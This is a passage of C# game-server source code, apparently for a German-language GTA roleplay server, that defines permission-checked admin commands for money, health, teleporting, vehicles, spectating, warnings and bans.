                var iPlayer = player.GetPlayer();
                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                    return;
                }

                var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 1) return;

                int amount;
                bool result = Int32.TryParse(command[1], out amount);
                if (!result || amount == 0)
                {
                    iPlayer.SendNewNotification("Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);

                if (findPlayer == null) return;

                if (amount > 0)
                {
                    findPlayer.GiveBankMoney(amount, "Administrative Erstattung");

                    iPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() + " $" + amount +
                                            " gegeben.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    findPlayer.SendNewNotification("Administrator" + iPlayer.GetName() + " hat ihnen $" +
                                               amount + " gegeben.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    if (iPlayer.RankId < (int)AdminLevelTypes.Founder)
                        Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                            "Admin " + iPlayer.GetName() + " hat " + findPlayer.GetName() + " $" + amount + " gegeben!");

                    DatabaseLogging.Instance.LogAdminAction(player, findPlayer.GetName(), AdminLogTypes.log, $"{amount}$ Givemoney");
                    return;
                }

                findPlayer.TakeBankMoney(Math.Abs(amount));

                iPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() + " $" + amount +
                                        " entfernt.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                findPlayer.SendNewNotification("Administrator" + iPlayer.GetName() + " hat ihnen $" +
                                           amount + " entfernt.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                if (iPlayer.RankId < (int)AdminLevelTypes.Founder)
                    Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                        "Admin " + iPlayer.GetName() + " hat " + findPlayer.GetName() + " $" + amount + " entfernt!");

                DatabaseLogging.Instance.LogAdminAction(player, findPlayer.GetName(), AdminLogTypes.log, $"-{amount}$ Givemoney");
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void sethp(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    var iPlayer = player.GetPlayer();

                    if (!iPlayer.CanAccessMethod())
                    {
                        iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                        return;
                    }

                    var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                    if (command.Length <= 1) return;

                    int hp;
                    bool result = Int32.TryParse(command[1], out hp);
                    if (!result || hp == 0)
                    {
                        iPlayer.SendNewNotification("Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                        return;
                    }

                    var findPlayer = Players.Players.Instance.FindPlayer(command[0], true);

                    if (findPlayer == null) return;

                    findPlayer.SetHealth(hp);
                    iPlayer.SendNewNotification(
                                            $"Sie haben die HP von {findPlayer.GetName()} auf {hp} gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void module(Player player, string module)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            dbPlayer.SendNewNotification(Modules.Instance.Reload(module) ? "Reloaded" : "Module not found", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void reloadmodule(Player player, string module)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;

            dbPlayer.SendNewNotification(Modules.Instance.Reload(module) ? "Reloaded" : "Module not found", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void supportinsel(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            player.SetPosition(new Vector3(3639.863, 4999.76, 12.46784));
            iPlayer.SendNewNotification("Sie haben sich zur Supportinsel geportet!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void noobspawn(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            player.SetPosition(new Vector3(-1042.308, -2745.383, 21.35941));
            iPlayer.SendNewNotification("Sie haben sich zum Zivilisten Spawn geportet!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void joinmars(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.EnterMars();
            player.SetPosition(SpaceModule.MarsShuttleEnter);
            iPlayer.SetDimension(0);
            iPlayer.SendNewNotification("Sie haben sich zum Mars Spawn geportet!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void leavemars(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.LeaveMars();
            player.SetPosition(SpaceModule.EarthShuttleEnter);
            iPlayer.SetDimension(0);
            iPlayer.SendNewNotification("Sie haben sich zum Erde Spawn geportet!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void freeplayer(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var findPlayer = Players.Players.Instance.FindPlayer(name, true);

            if (findPlayer == null) return;

            if (iPlayer.RankId < (int)AdminLevelTypes.Staff)
                Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                    iPlayer.GetName() + " hat " + findPlayer.GetName() + " aus dem Gefaengnis entlassen!");
            //Main.freePlayer(iPlayer, findPlayer, true);
            findPlayer.JailTime[0] = 1;
            PlayerSpawn.OnPlayerSpawn(findPlayer.Player);
            iPlayer.SendNewNotification("Sie haben " + findPlayer.GetName() +
                                    " aus dem Gefaengnis entlassen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            findPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                       " hat Sie aus dem Gefaengnis entlassen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setgarage(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 0) return;
            if (!uint.TryParse(command[0], out uint dbId)) return;

            SxVehicle Vehicle = VehicleHandler.Instance.GetByVehicleDatabaseId(dbId);
            if (Vehicle == null) return;
            if (Vehicle.IsPlayerVehicle())
            {
                Vehicle.SetPrivateCarGarage(1);
                iPlayer.SendNewNotification("Fahrzeug wurde in die Garage gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            else if (Vehicle.IsTeamVehicle())
            {
                Vehicle.SetTeamCarGarage(true);
                iPlayer.SendNewNotification("Team-Fahrzeug wurde in die Garage gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            DatabaseLogging.Instance.LogAdminAction(player, iPlayer.GetName(), AdminLogTypes.setgarage, "VehId: " + dbId, 0, Devmode);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setdpos(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                try
                {
                    var iPlayer = player.GetPlayer();
                    if (iPlayer == null || !iPlayer.IsValid()) return;
                    if (!iPlayer.CanAccessMethod())
                    {
                        iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                        return;
                    }
                    if (String.IsNullOrEmpty(commandParams)) return;
                    var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                    if (command.Length <= 0) return;
                    if (!uint.TryParse(command[0], out uint dbId)) return;

                    SxVehicle Vehicle = VehicleHandler.Instance.GetByVehicleDatabaseId(dbId);
                    if (Vehicle == null) return;
                    if (Vehicle.IsPlayerVehicle())
                    {
                        Vehicle.SetPrivateCarGarage(1, (uint)716);
                        iPlayer.SendNewNotification("Fahrzeug wurde in die Admingarage gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    }
                    else if (Vehicle.IsTeamVehicle())
                    {
                        Vehicle.SetTeamCarGarage(true);
                        iPlayer.SendNewNotification("Team-Fahrzeug wurde in die Garage gesetzt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    }

                    DatabaseLogging.Instance.LogAdminAction(player, iPlayer.GetName(), AdminLogTypes.setdpos, "VehId: " + dbId, 0, Devmode);
                }
                catch (Exception e)
                {
                    Logger.Crash(e);
                }
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gotoveh(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var command = commandParams.Split(new[] { ' ' }, 1, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
                if (command.Length <= 0) return;

                if (!uint.TryParse(command[0], out uint dbId)) return;
                SxVehicle Vehicle = VehicleHandler.Instance.GetByVehicleDatabaseId(dbId);
                if (Vehicle == null) return;

                Vector3 _pos = Vehicle.Entity.Position;
                if (iPlayer.RageExtension.IsInVehicle)
                {
                    player.Vehicle.Position = _pos;
                }
                else
                {
                    player.SetPosition(_pos);
                }

                iPlayer.SendNewNotification("Sie haben sich zu Fahrzeug " + Vehicle.databaseId +
                                        " teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }));
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vehicleinfo(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            int countVehicles = VehicleHandler.Instance.GetAllVehicles().Count();
            int countModVehicles = VehicleHandler.Instance.GetAllVehicles().Where(sx => sx.Data.IsModdedCar > 0).Count();

            iPlayer.SendNewNotification($"Ausgeparkte Fahrzeuge: {countVehicles} (davon Modfahrzeuge: {countModVehicles})");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void id(Player player, string name)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var dbPlayer = player.GetPlayer();

                if (!dbPlayer.CanAccessMethod())
                {
                    dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindPlayer(name, true);

                if (findPlayer == null)
                {
                    findPlayer = Players.Players.Instance.FindByRageName(name);
                }

                if (findPlayer == null) return;

                dbPlayer.SendNewNotification(" Level " + findPlayer.Level +
                                        " Dimension " + findPlayer.DimensionType[0] +
                                        " Dimension-Id " + findPlayer.Player.Dimension +
                                        " Fraktions-Id " + findPlayer.Team.Id +
                                        (ServerFeatures.IsActive("ac-randomizedNames") ? " Generated Name " + findPlayer.Player.Name : "") +
                                        " VoiceHash: " + findPlayer.VoiceHash, title: $"INFO ({findPlayer.ForumId} - {findPlayer.GetName()})", notificationType: PlayerNotification.NotificationType.ADMIN);

            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vh(Player player, string name)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var dbPlayer = player.GetPlayer();

                if (!dbPlayer.CanAccessMethod())
                {
                    dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                var findPlayer = Players.Players.Instance.FindByVoiceHash(name);

                if (findPlayer == null) return;

                dbPlayer.SendNewNotification(" Level " + findPlayer.Level +
                                        " Dimension " + findPlayer.DimensionType[0] +
                                        " Dimension-Id " + findPlayer.Player.Dimension +
                                        " VoiceHash: " + findPlayer.VoiceHash, title: $"INFO ({findPlayer.ForumId} - {findPlayer.GetName()})", notificationType: PlayerNotification.NotificationType.ADMIN);

            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void modifywater(Player player, string heightstring)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!float.TryParse(heightstring, out float height)) return;

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                Weather.WeatherModule.Instance.SetWaterHeight(height);

            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async void kickall(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            await NAPI.Task.WaitForMainThread(0);

            foreach (var itr in Players.Players.Instance.players.Values)
            {
                if (!itr.IsValid()) continue;
                if (itr.Player != null)
                {
                    itr.Player.Kick();
                }
            }

            Configuration.Instance.IsServerOpen = false;
        }

        public async void testsync(Player player, string heightstring)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (!Int32.TryParse(heightstring, out int result)) return;

            await NAPI.Task.WaitForMainThread(0);
            int radius = 150;

            Random rnd = new Random();

            for (int i = 0; i < result; i++)
            {
                Vector3 spawnPos = iPlayer.Player.Position.Add(new Vector3(rnd.Next(-(int)radius, (int)radius), rnd.Next(-(int)radius, (int)radius), 0));

                int rndIdx = rnd.Next(VehicleDataModule.Instance.data.Values.Where(v => v.ClassificationId == 1).ToList().Count());

                VehicleHandler.Instance.CreateServerVehicle(
                            VehicleDataModule.Instance.data.Values.Where(v => v.ClassificationId == 1).ToList()[rndIdx].Id, true,
                            spawnPos, iPlayer.Player.Rotation.Z, 1, 1, iPlayer.Player.Dimension,
                            true, false, false, 0,
                            iPlayer.GetName(), 0, 999, (uint)iPlayer.Id, 100, 1000, "", "", 0, null, null, true);
            }
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async void devrestart(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!Configuration.Instance.DevMode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            iPlayer.SendNewNotification($"Restart eingeleitet! Es wird nach Mod-Updates gesucht und der Server anschließend neu gestartet. Kick in 10 Sekunden...", NotificationType.ADMIN, "RESTART", 10000);

            Logging.Logger.Debug($"Restart authentificated from: {iPlayer.GetName()}");

            await NAPI.Task.WaitForMainThread(10000);

            foreach (var itr in Players.Players.Instance.players.Values)
            {
                if (!itr.IsValid()) continue;
                if (itr.Player != null)
                {
                    itr.Player.Kick();
                }
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void blackout(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            Weather.WeatherModule.Instance.SetBlackout(!Weather.WeatherModule.Instance.Blackout);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void disapi(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            Configuration.Instance.disableAPILogin = !Configuration.Instance.disableAPILogin;
            iPlayer.SendNewNotification("API Login: " + (Configuration.Instance.disableAPILogin ? "deaktiviert" : "aktiviert"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async Task warnplayer(Player player, string commandParams)
        {

            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var dbPlayer = Players.Players.Instance.FindPlayer(command[0], true);

            if (dbPlayer == null) return;

            dbPlayer.warns[0] += 1;
            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() + " abgemahnt. Abmahnung: (" +
                                    dbPlayer.warns[0] + "/3), Grund: " + command[1] + "!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            await Chats.SendGlobalMessage("Administrator " + iPlayer.GetName() + " hat " +
                                           dbPlayer.GetName() + " verwarnt, Grund " + command[1] + "!", COLOR.RED, ICON.GLOB);

            dbPlayer.SendNewNotification("Du hast nun: " + dbPlayer.warns[0] + "/3 Abmahnungen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            DatabaseLogging.Instance.LogAdminAction(player, dbPlayer.GetName(), AdminLogTypes.warn, command[1], 0, Devmode);
            if (dbPlayer.warns[0] >= 3)
            {
                dbPlayer.Player.SendNotification("Account gesperrt, (3 Abmahnungen) Grund: " + command[1]);
                dbPlayer.Player.Kick("Account gesperrt, (3 Abmahnungen) Grund: " + command[1]);
            }

        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void clearwarn(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

            if (dbPlayer == null) return;

            if (dbPlayer.warns[0] > 0) dbPlayer.warns[0] -= 1;
            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() +
                                    " eine abmahnung gelöscht! Abmahnungen: (" + dbPlayer.warns[0] + "/3)", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            dbPlayer.SendNewNotification("Du hast nun: " + dbPlayer.warns[0] + "/3 Abmahnungen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async void banplayer(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var dbPlayer = Players.Players.Instance.FindPlayer(command[0], true);

            if (dbPlayer == null) return;

            var reason = "";

            if (command[1] != null && String.IsNullOrWhiteSpace(command[1]))
            {
                reason = command[1];
            }

            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() + " vom Server gebannt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            //NAPI.Chat.SendChatMessageToAll("Administrator " + iPlayer.GetName() + " hat " +
            //                               dbPlayer.GetName() + " vom Server gebannt! (Grund: " + command[1] + ")");
            await Chats.SendGlobalMessage("Administrator " + iPlayer.GetName() + " hat " +
                                    dbPlayer.GetName() + " vom Server gebannt! (Grund: " + command[1] + ")", COLOR.RED, ICON.GLOB);

            DatabaseLogging.Instance.LogAdminAction(player, dbPlayer.GetName(), AdminLogTypes.perm, command[1], 0, Devmode);
            dbPlayer.warns[0] = 3;
            dbPlayer.Player.SendNotification("Sie wurden gebannt! Grund: " + command[1]);
            dbPlayer.Player.Kick("Sie wurden gebannt! Grund: " + command[1]);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async void permban(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

            if (dbPlayer == null || !dbPlayer.IsValid()) return;

            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() +
                                    " von der Community ausgeschlossen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);

            if (!iPlayer.Rank.CanAccessFeature("hiddenBans"))
                await Chats.SendGlobalMessage(iPlayer.Rank.Name + " " + iPlayer.GetName() + " hat " +
                                               dbPlayer.GetName() + " von der Community ausgeschlossen!", COLOR.RED, ICON.GLOB);

            DatabaseLogging.Instance.LogAdminAction(player, dbPlayer.GetName(), AdminLogTypes.perm, "Community-Ausschluss", 0, Devmode);
            dbPlayer.warns[0] = 3;
            SocialBanHandler.Instance.AddEntry(dbPlayer.Player);
            dbPlayer.Player.SendNotification("Permanenter Ausschluss!");
            PlayerLoginDataValidationModule.SyncUserBanToForum(dbPlayer.ForumId);
            dbPlayer.Player.Kick("Permanenter Ausschluss!");
            dbPlayer.Player.Kick();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void spectateh(Player player, string id)
        {
            // Hau ma ab mit Voicehash alla
            /*try
            {
                if (player == null)
                    return;

                var iPlayer = player.GetPlayer();
                if (iPlayer == null || !iPlayer.IsValid())
                    return;

                if (id == null) return;
                
                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(MSG.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                DbPlayer dbPlayer = Players.Players.Instance.FindByVoiceHash(id);
                if (dbPlayer == null || !dbPlayer.IsValid()) return;
                this.spectate(player, dbPlayer.GetName());
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }*/
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void spectate(Player player, string name)
        {
            try
            {
                if (player == null)
                    return;

                var iPlayer = player.GetPlayer();
                if (iPlayer == null || !iPlayer.IsValid())
                    return;

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                if (name == null || name.Length < 3) return;

                var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

                if (dbPlayer == null || !dbPlayer.IsValid()) return;

                if (!iPlayer.HasData("lastPositionSpectate") && !iPlayer.HasData("lastDimensionSpectate"))
                {
                    iPlayer.SetData("lastPositionSpectate", player.Position);
                    iPlayer.SetData("lastDimensionSpectate", player.Dimension);
                }

                NAPI.Task.Run(() => { player.Transparency = 0; });
                iPlayer.SetDimension(dbPlayer.Player.Dimension);

                var pos = dbPlayer.Player.Position;
                if (dbPlayer.RageExtension.IsInVehicle)
                {
                    pos.Z += 5;
                }
                else if (dbPlayer.DimensionType[0] != DimensionType.World)
                {
                    pos.Z += 1;
                }
                else
                {
                    pos.X += 1;
                    pos.Y += 1;
                    pos.Z += 3;
                }

                player.SetPosition(pos);
                iPlayer.Player.Freeze(true, true, true);

                //iPlayer.Player.TriggerNewClient("spectateAdmin", dbPlayer.Player, true,0);


                if (iPlayer.RankId < (int)AdminLevelTypes.Staff)
                    Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                        iPlayer.GetName() + " spectated nun " + dbPlayer.GetName());

                iPlayer.SendNewNotification("Sie schauen nun " + dbPlayer.GetName() + " zu!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void spectatecar(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

            if (dbPlayer == null) return;
            if (!dbPlayer.RageExtension.IsInVehicle) return;

            iPlayer.SetData("lastPositionSpectate", player.Position);
            iPlayer.SetData("lastDimensionSpectate", player.Dimension);

            NAPI.Task.Run(() => { player.Transparency = 0; });

            iPlayer.SetDimension(dbPlayer.Player.Dimension);

            if (!VehicleHandler.Instance.TrySetPlayerIntoVehicleOccupantsAdmin(dbPlayer.Player.Vehicle.GetVehicle(), iPlayer))
            {
                iPlayer.SendNewNotification("Es sind keine freien Sitze mehr verfuegbar!", title: "Fahrzeug", notificationType: PlayerNotification.NotificationType.ERROR);
                return;
            }


            if (iPlayer.RankId < (int)AdminLevelTypes.Staff)
                Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                    iPlayer.GetName() + " spectated nun " + dbPlayer.GetName());

            iPlayer.SendNewNotification("Sie schauen nun " + dbPlayer.GetName() + " zu!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }



        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void stopspectate(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            NAPI.Task.Run(() => { player.Transparency = 255; });
            iPlayer.Player.Freeze(false, false, false);

            if (!iPlayer.HasData("lastPositionSpectate")) return;
            if (!iPlayer.HasData("lastDimensionSpectate")) return;

            player.SetPosition((Vector3)iPlayer.GetData("lastPositionSpectate"));
            iPlayer.SetDimension(iPlayer.GetData("lastDimensionSpectate"));
            iPlayer.Player.TriggerNewClient("spectateAdmin", iPlayer.Player, false, 0);

            iPlayer.ResetData("lastPositionSpectate");
            iPlayer.ResetData("lastDimensionSpectate");

            iPlayer.SendNewNotification("Spectating beendet ", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setmark(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (Configuration.Instance.DevMode)
                iPlayer.Player.TriggerNewClient("setmark", iPlayer.Player.Position.X, iPlayer.Player.Position.Y, iPlayer.Player.Position.Z, iPlayer.Player.Dimension);

            iPlayer.SetData("mark", player.Position);
            iPlayer.SendNewNotification("Position erfolgreich zwischengespeichert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gotomark(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (!iPlayer.HasData("mark")) return;

            Vector3 mark = iPlayer.GetData("mark");

            if (iPlayer.RageExtension.IsInVehicle)
            {
                player.Vehicle.Position = mark;
            }
            else
            {
                player.SetPosition(mark);
            }

            iPlayer.SendNewNotification("Sie haben sich zur gespeicherten Position teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void getrange(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
